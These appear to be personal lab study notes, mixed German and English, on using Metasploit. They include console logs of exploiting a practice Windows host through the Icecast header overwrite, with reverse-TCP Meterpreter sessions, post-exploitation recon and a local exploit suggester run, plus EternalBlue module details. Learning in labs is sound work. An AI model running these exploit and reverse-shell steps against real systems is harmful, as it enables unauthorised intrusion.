# Metasploit

### essenzials

connect 10.10.216.126 8000

ziel: 
set RHOSTS 10.10.216.126

setg RHOSTS 10.10.216.126

ich: 
set LHOST 10.9.60.67

db_nmap -sV -vv 10.10.120.90

vulns

services

my ip:
ip addr

run job in background: 
run -j

jobs

sessions

sessions -i [jobNr.]

in der Sessionn:

getuid

sysinfo

ps

nach exploits suchen: 
run post/multi/recon/local_exploit_suggester



#### Initializing:

sudo msfdb init

msfconsole -h

msfconsole

    msf5 > db_status
    [*] Connected to msf. Connection type: postgresql.
    
    msf5 > help
    
    msf5 > search eternal
    
    sf5 > search eternal

    Matching Modules
    ================
    
       #  Name                                           Disclosure Date  Rank     Check  Description
       -  ----                                           ---------------  ----     -----  -----------
       0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
       1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
       2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
       3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
       4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
       5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
    
    
    Interact with a module by name or index, for example use 5 or use exploit/windows/smb/smb_doublepulsar_rce
    
    msf5 > use 2
    [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
    
    msf5 exploit(windows/smb/ms17_010_eternalblue) > info
    
    msf5 exploit(windows/smb/ms17_010_eternalblue) > connect 10.10.216.126 8000
    [*] Connected to 10.10.216.126:8000 (via: 0.0.0.0:0)
    whoami
    
    HTTP/1.0 401 Authentication Required
    WWW-Authenticate: Basic realm="Icecast2 Server"
    
    You need to authenticate
    
    msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

    Module options (exploit/windows/smb/ms17_010_eternalblue):
    
       Name           Current Setting  Required  Description
       ----           ---------------  --------  -----------
       RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
       RPORT          445              yes       The target port (TCP)
       SMBDomain      .                no        (Optional) The Windows domain to use for authentication
       SMBPass                         no        (Optional) The password for the specified username
       SMBUser                         no        (Optional) The username to authenticate as
       VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
       VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
    
    
    Payload options (windows/x64/meterpreter/reverse_tcp):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
       LPORT     4444             yes       The listen port
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Windows 7 and Server 2008 R2 (x64) All Service Packs
    
    
    msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.216.126
    RHOSTS => 10.10.216.126
    
    ---------Variablen Global setzen!-------
    msf5 exploit(windows/smb/ms17_010_eternalblue) > setg RHOSTS 10.10.216.126
    RHOSTS => 10.10.216.126
    
    msf5 exploit(windows/smb/ms17_010_eternalblue) > db_nmap -sV 10.10.120.90
    [*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-05 14:02 EST
    [*] Nmap: Nmap scan report for 10.10.120.90
    [*] Nmap: Host is up (0.035s latency).
    [*] Nmap: Not shown: 988 closed ports
    [*] Nmap: PORT      STATE SERVICE            VERSION
    [*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
    [*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
    [*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
    [*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
    [*] Nmap: 5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    [*] Nmap: 8000/tcp  open  http               Icecast streaming media server
    [*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
    [*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
    [*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
    [*] Nmap: 49158/tcp open  msrpc              Microsoft Windows RPC
    [*] Nmap: 49159/tcp open  msrpc              Microsoft Windows RPC
    [*] Nmap: 49160/tcp open  msrpc              Microsoft Windows RPC
    [*] Nmap: Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
    [*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 62.65 seconds
    
    msf5 exploit(windows/smb/ms17_010_eternalblue) > hosts

    Hosts
    =====
    
    address       mac  name  os_name  os_flavor  os_sp  purpose  info  comments
    -------       ---  ----  -------  ---------  -----  -------  ----  --------
    10.10.120.90             Unknown                    device         
    
    msf5 exploit(windows/smb/ms17_010_eternalblue) > vulns
    
    Vulnerabilities
    ===============
    
    Timestamp  Host  Name  References
    ---------  ----  ----  ----------

    msf5 exploit(windows/smb/ms17_010_eternalblue) > services
    Services
    ========
    
    host          port   proto  name               state  info
    ----          ----   -----  ----               -----  ----
    10.10.120.90  135    tcp    msrpc              open   Microsoft Windows RPC
    10.10.120.90  139    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn
    10.10.120.90  445    tcp    microsoft-ds       open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
    10.10.120.90  3389   tcp    ssl/ms-wbt-server  open   
    10.10.120.90  5357   tcp    http               open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
    10.10.120.90  8000   tcp    http               open   Icecast streaming media server
    10.10.120.90  49152  tcp    msrpc              open   Microsoft Windows RPC
    10.10.120.90  49153  tcp    msrpc              open   Microsoft Windows RPC
    10.10.120.90  49154  tcp    msrpc              open   Microsoft Windows RPC
    10.10.120.90  49158  tcp    msrpc              open   Microsoft Windows RPC
    10.10.120.90  49159  tcp    msrpc              open   Microsoft Windows RPC
    10.10.120.90  49160  tcp    msrpc              open   Microsoft Windows RPC

    msf5 exploit(multi/handler) > use icecast
    [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
    
    Matching Modules
    ================
    
       #  Name                                 Disclosure Date  Rank   Check  Description
       -  ----                                 ---------------  ----   -----  -----------
       0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
    
    
    [*] Using exploit/windows/http/icecast_header
    msf5 exploit(windows/http/icecast_header) > use 6
    msf5 exploit(windows/http/icecast_header) > use multi/handler
    [*] Using configured payload generic/shell_reverse_tcp
    msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
    PAYLOAD => windows/meterpreter/reverse_tcp
    msf5 exploit(multi/handler) > show options
    
    Module options (exploit/multi/handler):
    
       Name  Current Setting  Required  Description
       ----  ---------------  --------  -----------
    
    
    Payload options (windows/meterpreter/reverse_tcp):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST                      yes       The listen address (an interface may be specified)
       LPORT     4444             yes       The listen port
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Wildcard Target
    
    
    msf5 exploit(multi/handler) > ip addr
    [*] exec: ip addr
    
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
           valid_lft forever preferred_lft forever
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
        link/ether 08:00:27:5c:65:26 brd ff:ff:ff:ff:ff:ff
        inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
           valid_lft 65979sec preferred_lft 65979sec
        inet6 fe80::a00:27ff:fe5c:6526/64 scope link noprefixroute 
           valid_lft forever preferred_lft forever
    3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
        link/none 
        inet 10.9.60.67/16 brd 10.9.255.255 scope global tun0
           valid_lft forever preferred_lft forever
        inet6 fe80::911c:df5a:ac5:e01f/64 scope link stable-privacy 
           valid_lft forever preferred_lft forever
    msf5 exploit(multi/handler) > set LHOST 10.9.60.67
    LHOST => 10.9.60.67
    msf5 exploit(multi/handler) > show options
    
    Module options (exploit/multi/handler):
    
       Name  Current Setting  Required  Description
       ----  ---------------  --------  -----------
    
    
    Payload options (windows/meterpreter/reverse_tcp):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST     10.9.60.67       yes       The listen address (an interface may be specified)
       LPORT     4444             yes       The listen port
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Wildcard Target

    msf5 exploit(multi/handler) > use icecast
    [*] Using configured payload windows/meterpreter/reverse_tcp
    
    Matching Modules
    ================
    
       #  Name                                 Disclosure Date  Rank   Check  Description
       -  ----                                 ---------------  ----   -----  -----------
       0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
    
    
    [*] Using exploit/windows/http/icecast_header
    msf5 exploit(windows/http/icecast_header) > set RHOSTS 10.10.120.90
    RHOSTS => 10.10.120.90
    msf5 exploit(windows/http/icecast_header) > show options
    
    Module options (exploit/windows/http/icecast_header):
    
       Name    Current Setting  Required  Description
       ----    ---------------  --------  -----------
       RHOSTS  10.10.120.90     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
       RPORT   8000             yes       The target port (TCP)
    
    
    Payload options (windows/meterpreter/reverse_tcp):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
       LPORT     4444             yes       The listen port
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Automatic

    msf5 exploit(windows/http/icecast_header) > set LHOST 10.9.60.67
    LHOST => 10.9.60.67
    msf5 exploit(windows/http/icecast_header) > show options
    
    Module options (exploit/windows/http/icecast_header):
    
       Name    Current Setting  Required  Description
       ----    ---------------  --------  -----------
       RHOSTS  10.10.120.90     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
       RPORT   8000             yes       The target port (TCP)
    
    
    Payload options (windows/meterpreter/reverse_tcp):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST     10.9.60.67       yes       The listen address (an interface may be specified)
       LPORT     4444             yes       The listen port
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Automatic
    
    
    msf5 exploit(windows/http/icecast_header) > run -j
    [*] Exploit running as background job 1.
    [*] Exploit completed, but no session was created.
    msf5 exploit(windows/http/icecast_header) > 
    [*] Started reverse TCP handler on 10.9.60.67:4444 
    [*] Sending stage (176195 bytes) to 10.10.120.90
    [*] Meterpreter session 1 opened (10.9.60.67:4444 -> 10.10.120.90:49204) at 2020-11-05 14:27:03 -0500

    msf5 exploit(windows/http/icecast_header) > sessions
    
    Active sessions
    ===============
    
      Id  Name  Type                     Information             Connection
      --  ----  ----                     -----------             ----------
      1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.9.60.67:4444 -> 10.10.120.90:49204 (10.10.120.90)

    msf5 exploit(windows/http/icecast_header) > sessions -i 1
    [*] Starting interaction with 1...
    
    meterpreter > 
    meterpreter > 
    meterpreter > Interrupt: use the 'exit' command to quit
    meterpreter > exit
    [*] Shutting down Meterpreter...
    
    [*] 10.10.120.90 - Meterpreter session 1 closed.  Reason: User exit

    ---------Neue Session----------
    
    msf5 exploit(windows/http/icecast_header) > set RHOSTS 10.10.239.197
    RHOSTS => 10.10.239.197
    msf5 exploit(windows/http/icecast_header) > run -j
    [*] Exploit running as background job 3.
    [*] Exploit completed, but no session was created.
    msf5 exploit(windows/http/icecast_header) > 
    [*] Started reverse TCP handler on 10.9.60.67:4444 
    [*] Sending stage (176195 bytes) to 10.10.239.197
    [*] Meterpreter session 2 opened (10.9.60.67:4444 -> 10.10.239.197:49172) at 2020-11-06 14:52:46 -0500
    
    msf5 exploit(windows/http/icecast_header) > jobs
    
    Jobs
    ====
    
    No active jobs.
    
    msf5 exploit(windows/http/icecast_header) > sessions
    
    Active sessions
    ===============
    
      Id  Name  Type                     Information             Connection
      --  ----  ----                     -----------             ----------
      2         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.9.60.67:4444 -> 10.10.239.197:49172 (10.10.239.197)
      
    msf5 exploit(windows/http/icecast_header) > sessions -i 2
    [*] Starting interaction with 2...
    
    
    ---------In the Session-------
    
    meterpreter > ps

    Process List
    ============
    
     PID   PPID  Name                  Arch  Session  User          Path
     ---   ----  ----                  ----  -------  ----          ----
     0     0     [System Process]                                   
     4     0     System                                             
     100   2632  mscorsvw.exe                                       
     416   4     smss.exe                                           
     492   692   svchost.exe                                        
     544   536   csrss.exe                                          
     584   692   svchost.exe                                        
     596   536   wininit.exe                                        
     604   584   csrss.exe                                          
     652   584   winlogon.exe                                       
     692   596   services.exe                                       
     700   596   lsass.exe                                          
     708   596   lsm.exe                                            
     816   692   svchost.exe                                        
     884   692   svchost.exe                                        
     932   692   svchost.exe                                        
     1060  692   svchost.exe                                        
     1136  692   svchost.exe                                        
     1260  692   spoolsv.exe                                        
     1324  692   svchost.exe                                        
     1428  692   taskhost.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
     1500  692   amazon-ssm-agent.exe                               
     1512  492   dwm.exe               x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
     1524  1484  explorer.exe          x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
     1704  692   LiteAgent.exe                                      
     1724  816   WmiPrvSE.exe                                       
     1744  692   svchost.exe                                        
     1800  692   sppsvc.exe                                         
     1884  692   Ec2Config.exe                                      
     2124  692   svchost.exe                                        
     2252  1524  Icecast2.exe          x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
     2300  692   vds.exe                                            
     2316  816   WmiPrvSE.exe                                       
     2472  692   TrustedInstaller.exe                               
     2560  692   SearchIndexer.exe                                  
     2608  584   taskeng.exe                                        
     2632  692   mscorsvw.exe                                       
     2916  692   mscorsvw.exe                                       
    
    meterpreter > getuid
    Server username: Dark-PC\Dark
    meterpreter > sysinfo
    Computer        : DARK-PC
    OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 2
    Meterpreter     : x86/windows

    meterpreter > getprivs
    
    Enabled Process Privileges
    ==========================
    
    Name
    ----
    SeChangeNotifyPrivilege
    SeIncreaseWorkingSetPrivilege
    SeShutdownPrivilege
    SeTimeZonePrivilege
    SeUndockPrivilege

    meterpreter > run post/windows/gather/checkvm
    
    [*] Checking if DARK-PC is a Virtual Machine ...
    [+] This is a Xen Virtual Machine
    
    
    meterpreter > run post/multi/recon/local_exploit_suggester
    
    [*] 10.10.239.197 - Collecting local exploits for x86/windows...
    [*] 10.10.239.197 - 34 exploit checks are being tried...
    [+] 10.10.239.197 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
    nil versions are discouraged and will be deprecated in Rubygems 4
    [+] 10.10.239.197 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
    [+] 10.10.239.197 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
    [+] 10.10.239.197 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
    [+] 10.10.239.197 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
    [+] 10.10.239.197 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
    [+] 10.10.239.197 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
    [+] 10.10.239.197 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
    [+] 10.10.239.197 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.


    meterpreter > run post/windows/manage/enable_rdp
    
    [-] Insufficient privileges, Remote Desktop Service was not modified
    [*] For cleanup execute Meterpreter resource file: /home/kali/.msf4/loot/20201106151019_default_10.10.239.197_host.windows.cle_167732.txt


    meterpreter > shell
    Process 1988 created.
    Channel 5 created.
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
    
    C:\Program Files (x86)\Icecast2 Win32>

    meterpreter > run autoroute -h

    [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
    [!] Example: run post/multi/manage/autoroute OPTION=value [...]
    [*] Usage:   run autoroute [-r] -s subnet -n netmask
    [*] Examples:
    [*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
    [*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
    [*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay
    [*]   run autoroute -p                            # Print active routing table
    [*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route
    [*] Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
    [-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module
    
        


---

msf5 exploit(windows/smb/ms17_010_eternalblue) > info

               Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
         Module: exploit/windows/smb/ms17_010_eternalblue
       Platform: Windows
           Arch: 
     Privileged: Yes
        License: Metasploit Framework License (BSD)
           Rank: Average
      Disclosed: 2017-03-14
    
    Provided by:
      Sean Dillon <sean.dillon@risksense.com>
      Dylan Davis <dylan.davis@risksense.com>
      Equation Group
      Shadow Brokers
      thelightcosine
    
    Available targets:
      Id  Name
      --  ----
      0   Windows 7 and Server 2008 R2 (x64) All Service Packs
    
    Check supported:
      Yes
    
    Basic options:
      Name           Current Setting  Required  Description
      ----           ---------------  --------  -----------
      RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
      RPORT          445              yes       The target port (TCP)
      SMBDomain      .                no        (Optional) The Windows domain to use for authentication
      SMBPass                         no        (Optional) The password for the specified username
      SMBUser                         no        (Optional) The username to authenticate as
      VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
      VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
    
    Payload information:
      Space: 2000
    
    Description:
      This module is a port of the Equation Group ETERNALBLUE exploit, 
      part of the FuzzBunch toolkit released by Shadow Brokers. There is a 
      buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is 
      calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error 
      where a DWORD is subtracted into a WORD. The kernel pool is groomed 
      so that overflow is well laid-out to overwrite an SMBv1 buffer. 
      Actual RIP hijack is later completed in 
      srvnet!SrvNetWskReceiveComplete. This exploit, like the original may 
      not trigger 100% of the time, and should be run continuously until 
      triggered. It seems like the pool will get hot streaks and need a 
      cool down period before the shells rain in again. The module will 
      attempt to use Anonymous login, by default, to authenticate to 
      perform the exploit. If the user supplies credentials in the 
      SMBUser, SMBPass, and SMBDomain options it will use those instead. 
      On some systems, this module may cause system instability and 
      crashes, such as a BSOD or a reboot. This may be more likely with 
      some payloads.
    
    References:
      https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
      https://cvedetails.com/cve/CVE-2017-0143/
      https://cvedetails.com/cve/CVE-2017-0144/
      https://cvedetails.com/cve/CVE-2017-0145/
      https://cvedetails.com/cve/CVE-2017-0146/
      https://cvedetails.com/cve/CVE-2017-0147/
      https://cvedetails.com/cve/CVE-2017-0148/
      https://github.com/RiskSense-Ops/MS17-010
    
    Also known as:
      ETERNALBLUE

    
    
    
    
    
    
    
    
---
msf5 > help

    Core Commands
    =============
    
        Command       Description
        -------       -----------
        ?             Help menu
        banner        Display an awesome metasploit banner
        cd            Change the current working directory
        color         Toggle color
        connect       Communicate with a host
        debug         Display information useful for debugging
        exit          Exit the console
        get           Gets the value of a context-specific variable
        getg          Gets the value of a global variable
        grep          Grep the output of another command
        help          Help menu
        history       Show command history
        load          Load a framework plugin
        quit          Exit the console
        repeat        Repeat a list of commands
        route         Route traffic through a session
        save          Saves the active datastores
        sessions      Dump session listings and display information about sessions
        set           Sets a context-specific variable to a value
        setg          Sets a global variable to a value
        sleep         Do nothing for the specified number of seconds
        spool         Write console output into a file as well the screen
        threads       View and manipulate background threads
        tips          Show a list of useful productivity tips
        unload        Unload a framework plugin
        unset         Unsets one or more context-specific variables
        unsetg        Unsets one or more global variables
        version       Show the framework and console library version numbers
    
    
    Module Commands
    ===============
    
        Command       Description
        -------       -----------
        advanced      Displays advanced options for one or more modules
        back          Move back from the current context
        clearm        Clear the module stack
        info          Displays information about one or more modules
        listm         List the module stack
        loadpath      Searches for and loads modules from a path
        options       Displays global options or for one or more modules
        popm          Pops the latest module off the stack and makes it active
        previous      Sets the previously loaded module as the current module
        pushm         Pushes the active or list of modules onto the module stack
        reload_all    Reloads all modules from all defined module paths
        search        Searches module names and descriptions
        show          Displays modules of a given type, or all modules
        use           Interact with a module by name or search term/index
    
    
    Job Commands
    ============
    
        Command       Description
        -------       -----------
        handler       Start a payload handler as job
        jobs          Displays and manages jobs
        kill          Kill a job
        rename_job    Rename a job
    
    
    Resource Script Commands
    ========================
    
        Command       Description
        -------       -----------
        makerc        Save commands entered since start to a file
        resource      Run the commands stored in a file
    
    
    Database Backend Commands
    =========================
    
        Command           Description
        -------           -----------
        analyze           Analyze database information about a specific address or address range
        db_connect        Connect to an existing data service
        db_disconnect     Disconnect from the current data service
        db_export         Export a file containing the contents of the database
        db_import         Import a scan result file (filetype will be auto-detected)
        db_nmap           Executes nmap and records the output automatically
        db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
        db_remove         Remove the saved data service entry
        db_save           Save the current data service connection as the default to reconnect on startup
        db_status         Show the current data service status
        hosts             List all hosts in the database
        loot              List all loot in the database
        notes             List all notes in the database
        services          List all services in the database
        vulns             List all vulnerabilities in the database
        workspace         Switch between database workspaces
    
    
    Credentials Backend Commands
    ============================
    
        Command       Description
        -------       -----------
        creds         List all credentials in the database
    
    
    Developer Commands
    ==================
    
        Command       Description
        -------       -----------
        edit          Edit the current module or a file with the preferred editor
        irb           Open an interactive Ruby shell in the current context
        log           Display framework.log paged to the end if possible
        pry           Open the Pry debugger on the current module or Framework
        reload_lib    Reload Ruby library files from specified paths
    
    
    msfconsole
    ==========
    
    `msfconsole` is the primary interface to Metasploit Framework. There is quite a
    lot that needs go here, please be patient and keep an eye on this space!
    
    Building ranges and lists
    -------------------------
    
    Many commands and options that take a list of things can use ranges to avoid
    having to manually list each desired thing. All ranges are inclusive.
    
    ### Ranges of IDs
    
    Commands that take a list of IDs can use ranges to help. Individual IDs must be
    separated by a `,` (no space allowed) and ranges can be expressed with either
    `-` or `..`.
    
    ### Ranges of IPs
    
    There are several ways to specify ranges of IP addresses that can be mixed
    together. The first way is a list of IPs separated by just a ` ` (ASCII space),
    with an optional `,`. The next way is two complete IP addresses in the form of
    `BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
    specifications may also be used, however the whole address must be given to
    Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
    Additionally, a netmask can be used in conjunction with a domain name to
    dynamically resolve which block to target. All these methods work for both IPv4
    and IPv6 addresses. IPv4 addresses can also be specified with special octet
    ranges from the [NMAP target
    specification](https://nmap.org/book/man-target-specification.html)
    
    ### Examples
    
    Terminate the first sessions:
    
        sessions -k 1
    
    Stop some extra running jobs:
    
        jobs -k 2-6,7,8,11..15
    
    Check a set of IP addresses:
    
        check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255
    
    Target a set of IPv6 hosts:
    
        set RHOSTS fe80::3990:0000/110, ::1-::f0f0
    
    Target a block from a resolved domain name:
    
        set RHOSTS www.example.test/24

---
msfconsole -h

    Usage: msfconsole [options]
    
    Common options:
        -E, --environment ENVIRONMENT    Set Rails environment, defaults to RAIL_ENV environment variable or 'production'
    
    Database options:
        -M, --migration-path DIRECTORY   Specify a directory containing additional DB migrations
        -n, --no-database                Disable database support
        -y, --yaml PATH                  Specify a YAML file containing database settings
    
    Framework options:
        -c FILE                          Load the specified configuration file
        -v, -V, --version                Show version
    
    Module options:
            --defer-module-loads         Defer module loading unless explicitly asked
        -m, --module-path DIRECTORY      Load an additional module path
    
    Console options:
        -a, --ask                        Ask before exiting Metasploit or accept 'exit -y'
        -H, --history-file FILE          Save command history to the specified file
        -L, --real-readline              Use the system Readline library instead of RbReadline
        -o, --output FILE                Output to the specified file
        -p, --plugin PLUGIN              Load a plugin on startup
        -q, --quiet                      Do not print the banner on startup
        -r, --resource FILE              Execute the specified resource file (- for stdin)
        -x, --execute-command COMMAND    Execute the specified console commands (use ; for multiples)
        -h, --help                       Show this message



